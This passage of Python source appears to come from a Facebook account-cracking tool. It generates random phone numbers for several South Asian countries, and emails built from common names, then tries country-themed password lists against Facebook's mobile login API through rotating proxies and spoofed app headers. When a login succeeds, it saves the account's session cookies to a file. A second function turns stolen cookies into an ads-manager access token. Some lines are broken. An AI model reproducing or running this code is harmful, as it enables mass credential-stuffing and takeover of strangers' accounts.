                print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                input(f' {G1}[{A}≈{G1}]{G1} PRESS ENTER TO BACK ')
                menu()

def afg():
                user=[]
                clear()
                print(f' {G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{A} +9370{G}/{A}+9377{G}/{A}+9379{G}/{A}+9374{G}/{A}+9378')
                code = input(f' {G1}[{A}?{G1}]{G1} PUT CODE  {A}➢{G1} ')
                clear()
                try:
                        limit = int(input(f' {G1}[{A}≈{G1}]{G1}EXAMPLE : 2000, 3000, 5000, 10000\n{G1}[{A}?{G1}]{G1} CHOICE  {A}➢{G1} '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=30) as TENSIONg1:     
                        clear()
                        
                        tl = str(len(user))
                        print(f' {G1}[{A}≈{G1}]{G1} COUNTRY {A}➢{A} AFGANSTAN')
                        print(f' {G1}[{A}≈{G1}]{G1} SIM CODE  {A}➢{A} {code}')
                        print(f' {G1}[{A}≈{G1}]{G1} TOTAL UID {A}➢{A} {tl}')
                        print(f' {G1}[{A}≈{G1}]{G1} CRACKING.... {W}')
                        print(f" {G1}[{A}={G1}]{G1} TURN {G1}[{A}ON{G1}/{A}OFF{G1}] AIRPLANE MODE EVERY {A}3{G1} MIN")
                        line()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,ids[:8],'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','afghan1234','kabul1234','khankhan','khan123','khan123456','khan786']
                                TENSIONg1.submit(rd,ids,passlist)
                print(f'\033[1;37m')
                print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                print(f' {G1}[{A}≈{G1}]{G1} THE PROCESS HAS BEEN COMPLETED')
                print(f' {G1}[{A}≈{G1}]{G1} TOTAL OK ID {A}➢{G1} {str(len(ok))}')
                print(f' {G1}[{A}≈{G1}]{M} TOTAL CP ID {A}➢{M} {str(len(cp))}')
                print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                input(f' {G1}[{A}≈{G1}]{G1} PRESS ENTER TO BACK ')
                menu()
def ind():
                user=[]
                clear()
                print(f' {G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{A} +91639{G}/{A}+91934{G}/{A}+91902{G}/{A}+91701')
                code = input(f' {G1}[{A}?{G1}]{G1} PUT CODE {A}➢{G1} ')
                clear()
                try:
                        limit = int(input(f' {G1}[{A}≈{G1}]{G1}EXAMPLE : 2000, 3000, 5000, 10000\n{G1}[{A}?{G1}]{G1} CHOICE  {A}➢{G1} '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=30) as TENSIONgg:     
                        clear()
                        
                        tl = str(len(user))
                        print(f' {G1}[{A}≈{G1}]{G1} COUNTRY {A}➢{A} INDIA')
                        print(f' {G1}[{A}≈{G1}]{G1} SIM CODE  {A}➢{A} {code}')
                        print(f' {G1}[{A}≈{G1}]{G1} TOTAL UID {A}➢{A} {tl}')
                        print(f' {G1}[{A}≈{G1}]{G1} CRACKING.... {W}')
                        print(f" {G1}[{A}={G1}]{G1} TURN {G1}[{A}ON{G1}/{A}OFF{G1}] AIRPLANE MODE EVERY {A}3{G1} MIN")
                        line()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,ids[:8],ids[:6],ids[:7],ids[:5],'57273200','hindustan','57575751','59039200','57575752','india123']
                                TENSIONgg.submit(rd,ids,passlist)
                print(f'\033[1;37m')
                print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                print(f' {G1}[{A}≈{G1}]{G1} THE PROCESS HAS BEEN COMPLETED')
                print(f' {G1}[{A}≈{G1}]{G1} TOTAL OK ID {A}➢{G1} {str(len(ok))}')
                print(f' {G1}[{A}≈{G1}]{M} TOTAL CP ID {A}➢{M} {str(len(cp))}')
                print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                input(f' {G1}[{A}≈{G1}]{G1} PRESS ENTER TO BACK ')
                menu()
                
def nepal():
                user=[]
                clear()
                print(f' {G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{A}+9815{G}/{A}+9814{G}/{A}+9861{G}/{A}+9840')
                code = input(f' {G1}[{A}?{G1}]{G1} PUT CODE {A}➢{G1} ')
                clear()
                try:
                        limit = int(input(f' {G1}[{A}≈{G1}]{G1}EXAMPLE : 2000, 3000, 5000, 10000\n{G1}[{A}?{G1}]{G1} CHOICE  {A}➢{G1} '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(6))
                        user.append(nmp)
                with tred(max_workers=30) as TENSIONgg:     
                        clear()
                        
                        tl = str(len(user))
                        print(f' {G1}[{A}≈{G1}]{G1} COUNTRY {A}➢{A} NEPAL')
                        print(f' {G1}[{A}≈{G1}]{G1} SIM CODE  {A}➢{A} {code}')
                        print(f' {G1}[{A}≈{G1}]{G1} TOTAL UID {A}➢{A} {tl}')
                        print(f' {G1}[{A}≈{G1}]{G1} CRACKING.... {W}')
                        print(f" {G1}[{A}={G1}]{G1} TURN {G1}[{A}ON{G1}/{A}OFF{G1}] AIRPLANE MODE EVERY {A}3{G1} MIN")
                        line()
                        for love in user:
                                ids = code + love
                                passlist = [ids,love,ids[:8],ids[:7],ids[:6],'nepal12','nepal123','nepal1234','nepal12345','maya123','kathmandu','pokhara','tamang','maya1234','tamang123','nepal@123','kathmandu123','9848455117','1168914','9848370000','900166','5935229','98481653','98484667','98484667','98485213','98485465','512882','98485477','9848460350','3589290','9848657857','0073851','428058','854565']
                                TENSIONgg.submit(rd,ids,passlist)
                print(f'\033[1;37m')
                print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                print(f' {G1}[{A}≈{G1}]{G1} THE PROCESS HAS BEEN COMPLETED')
                print(f' {G1}[{A}≈{G1}]{G1} TOTAL OK ID {A}➢{G1} {str(len(ok))}')
                print(f' {G1}[{A}≈{G1}]{M} TOTAL CP ID {A}➢{M} {str(len(cp))}')
                print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                input(f' {G1}[{A}≈{G1}]{G1} PRESS ENTER TO BACK ')
                menu()

def indo():
                user=[]
                clear()
                print(f' {G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{A}021{G}/{A}031{G}/{A}035{G}/{A}071{G}/{A}0411')
                code = input(f' {G1}[{A}?{G1}]{G1} PUT CODE {A}➢{G1} ')
                clear()
                try:
                        limit = int(input(f' {G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{A}EXAMPLE : 2000, 3000, 5000, 10000\n{G1}[{A}?{G1}]{G1} CHOICE  {A}➢{G1} '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(8))
                        user.append(nmp)
                with tred(max_workers=30) as TENSIONgg:     
                        clear()
                        
                        tl = str(len(user))
                        print(f' {G1}[{A}≈{G1}]{G1} COUNTRY {A}➢{A} INDONESIA')
                        print(f' {G1}[{A}≈{G1}]{G1} SIM CODE  {A}➢{A} {code}')
                        print(f' {G1}[{A}≈{G1}]{G1} TOTAL UID {A}➢{A} {tl}')
                        print(f' {G1}[{A}≈{G1}]{G1} CRACKING.... {G1}')
                        print(f" {G1}[{A}={G1}]{G1} TURN {G1}[{A}ON{G1}/{A}OFF{G1}] AIRPLANE MODE EVERY {A}3{G1} MIN")
                        line()
                        for love in user:
                                ids = code + love
                                passlist = [ids,love,ids[:8],ids[:7],ids[:6],"indonesia",ids,'free fire','freefire']
                                TENSIONgg.submit(rd,ids,passlist)
                print(f'\033[1;37m')
                print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                print(f' {G1}[{A}≈{G1}]{G1} THE PROCESS HAS BEEN COMPLETED')
                print(f' {G1}[{A}≈{G1}]{G1} TOTAL OK ID {A}➢{G1} {str(len(ok))}')
                print(f' {G1}[{A}≈{G1}]{M} TOTAL CP ID {A}➢{M} {str(len(cp))}')
                print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                input(f' {G1}[{A}≈{G1}]{G1} PRESS ENTER TO BACK ')
                menu()

                      
def gmail():
                os.system('rm -rf .re.txt')
                clear()
                print(f' {G1}[{A}≈{G1}]{G1} example: muhammad, ali, sajjad, faizan\033[1;97m')
                line()
                first = input(f' {G1}[{A}≈{G1}]{G1}Put first name: ')
                line()
                print(f' {G1}[{A}≈{G1}]{G1} example: khan, ahmad, ali \033[1;97m')
                line()
                last = input(f' {G1}[{A}≈{G1}]{G1} Put last name: ')
                line()
                print(f' {G1}[{A}≈{G1}]{G1} Example: @gmail.com,@yahoo.com,@hotmail.com etc..')
                line()
                domain = input(f' {G1}[{A}≈{G1}]{G1}domain: ')
                line()
                try:
                        limit=int(input(f' {G1}[{A}≈{G1}]{G1}Put limit: '))
                except ValueError:
                        limit = 5000
                line()
                print(' Getting gmails...')
                lists = ['3','4']
                for xd in range(limit):
                        lchoice = random.choice(lists)
                        if '3' in lchoice:
                                mail = ''.join(random.choice(string.digits) for _ in range(3))
                                open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
                        else:
                                mail = ''.join(random.choice(string.digits) for _ in range(4))
                                open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
                        fo = open('.re.txt', 'r').read().splitlines()
                with tred(max_workers=30) as TENSIONgg:
                        tl = str(len(fo))
                        clear()
                        print(f' {G1}[{A}≈{G1}]{G1}{A}➢{G1}CRACKING.... {G1}')
                        print(f' {G1}[{A}≈{G1}]{G1}{A}➢{G1}GMAIL CLONING{A}➢{A}'+ domain)
                        print(f' {G1}[{A}≈{G1}]{A}➢{G1}TOTAL ACCOUNT{A}➢{A}'+ tl)
                        print(f" {G1}[{A}={G1}]{A}➢{G1}TURN {G1}[{A}ON{G1}/{A}OFF{G1}] AIRPLANE MODE EVERY {A}3{G1} MIN")                        
                        line()
                        for user in fo:
                                ids,names = user.split('|')
                                first_name = names.rsplit(' ')[0]
                                try:
                                        last_name = names.rsplit(' ')[1]
                                except IndexError:
                                        last_name = 'Khan'
                                fs = first_name.lower()
                                ls = last_name.lower()
                                passlist = [ids[:8],ids[:6],fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
                                TENSIONgg.submit(rd,ids,passlist)
                print(f'\033[1;37m')
                print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')                  
                print(f' {G1}[{A}≈{G1}]{G1}THE PROCESS HAS COMPLETED')
                print(f' {G1}[{A}≈{G1}]{G1}TOTAL OK/CP: '+str(len(ok))+'/'+str(len(cp)))
                print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                input(f' {G1}[{A}≈{G1}]{G1} PRESS ENTER TO BACK ')
                menu()
             
def rd(uid,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write(f'\r\r{A} [{G1}TENSION-XD{A}]{G1}%s|{G1}RNDM{A}|\033[1;32mOK:%s\033[1;37m|{G1}CP:%s\033[1;37m'%(loop,len(ok),len(cp)));sys.stdout.flush()
		a1 = random.choice(prox)
		proxs= {'http': 'socks4://'+a1}
		for pas in passlist:
			data = {'adid': str(uuid.uuid4()),
'format': 'json',
'device_id': str(uuid.uuid4()),
'family_device_id': str(uuid.uuid4()),
'secure_family_device_id': str(uuid.uuid4()),
'cpl': 'true',
'try_num': '1',
'email': uid,
'password': pas,
'method': 'auth.login',
'generate_session_cookies': '1',
'sim_serials': "['80973453345210784798']",
'openid_flow': 'android_login',
'openid_provider': 'google',
'openid_emails': "['01710940017']",
'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
'error_detail_type': 'button_with_disabled',
'source': 'account_recovery',
'locale': 'en_GB',
'client_country_code': 'GB',
'fb_api_req_friendly_name': 'authenticate',
'fb_api_caller_class': 'AuthOperations$PasswordAuthOperation'}			
			head = {'Host': 'graph.facebook.com',
'Content-Type': 'application/x-www-form-urlencoded',
'Accept-Encoding': 'gzip, deflate',
'Connection': 'keep-alive',
'Priority': 'u=3, i',
'X-Fb-Sim-Hni': '45204',
'X-Fb-Net-Hni': '45201',
'X-Fb-Connection-Quality': 'GOOD',
'Zero-Rated': '0',
'User-Agent': "Dalvik/2.1.0 (Linux; U; Android 10.0.1; Redmi Note 5 Pro Build/RD1A.201105.003.C1) [FBAN/MobileAdsManagerAndroid;FBAV/335.0.0.30.47;FBBV/489275666;FBDM/{density=2.75,width=720,height=1600};FBLC/en_US;FBRV/0;FBCR/Zong;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 5 Pro;FBSV/7.2;FBOP/1;FBCA/x86:armeabi-v7a;]','Dalvik/2.1.0 (Linux; U; Android 12; Pixel 3 Build/SP1A.210812.016.C2) [FBAN/Orca-Android;FBAV/412.0.0.15.69;FBPN/com.facebook.orca;FBLC/en_US;FBBV/481775700;FBCR/Verizon;FBMF/Google;FBBD/google;FBDV/Pixel 3;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2028};FBBK/1;FBLR/0;FB_FW/1;]','[FBAN/FB4A;FBAV/61.0.0.6595;FBBV/61279955;[FBAN/FB4A;FBAV/51.0.0.32.36;FBBV/538346501;FBDM/{density=2.3,width=800,height=1280};FBLC/en_ZA;FBRV/597679001;FB_FW/2;FBCR/Damag Syria;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-T280;FBSV/5.1.1;FBOP/19;FBCA/arm64-v8a:;]",
'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
'X-Fb-Connection-Bandwidth': '24807555',
'X-Fb-Connection-Type': 'MOBILE.LTE',
'X-Fb-Device-Group': '5120',
'X-Tigon-Is-Retry': 'False',
'X-Fb-Friendly-Name': 'authenticate',
'X-Fb-Request-Analytics-Tags': 'unknown',
'X-Fb-Http-Engine': 'Liger',
'X-Fb-Client-Ip': 'True',
'X-Fb-Server-Cluster': 'True',
'Content-Length': '847'}
			po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
			if 'session_key' in po:
				uid = str(po['uid'])
				print(f'\r\r{G} [TENSION-OK] '+uid+' [√] '+pas+' | '+TENSION(ids)+'\033[1;97m')
				ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
				TENSION1 = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={TENSION1};{ckkk}"
				print(f'\r{G1}[{S}COOKIE🍪{G1}] :{A} '+ckkk)
				open('/sdcard/TENSION-RNDM-OK-COOKIE.txt','a').write(uid+'[√]'+pas+'|'+cookie+'\n')
				ok.append(uid)
				break
			elif 'www.facebook.com' in po['error']['message']:
				uid = str(po['error']['error_data']['uid'])
				print(f'\r{R} [TENSION-CP] '+uid+' [√] '+pas+'\033[1;37m')
				open('/sdcard/TENSION-RNDM-CP.txt','a').write(uid+'|'+pas+'\n')
				cp.append(uid)
				break
			else:
				continue
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleeprint(20)
	except Exception as e:
		pass


def login():
    clear()
    print('\x1b[00m\tLogin Using Cookies') 
    try:
        fbcokis= input('\n\x1b[00mPut Cookies:\x1b[92m')
        fact = requests.get("https://adsmanager.facebook.com/adsmanager/", cookies = {"cookie":fbcokis},headers=head).text
        act = re.search("act=(.*?)&nav_source",str(fact)).group(1)
        ftoken = requests.get(f"https://adsmanager.facebook.com/adsmanager/manage/campaigns?act={act}&nav_source=no_referrer", cookies = {"cookie":fbcokis}).text
        eaab = re.search('accessToken="(.*?)"',str(ftoken)).group(1)
        open(".tokn.txt", "w").write(eaab)
        open(".cokis.txt", "w").write(fbcokis)
        token = open('.tokn.txt','r').read()
        info = requests.get('https://graph.facebook.com/me/?access_token='+token,cookies = {"cookie":fbcokis}).json()
        print(f"{R}Login Successfully")
        menu()
    except Exception as error: 
        os.system("rm -f .tokn.txt")
        print("\x1b[1;91m\n\t\t[!] Cookies Expired ")
        slp(2)
        login()
        
#####____END-Setup____#####   
menu()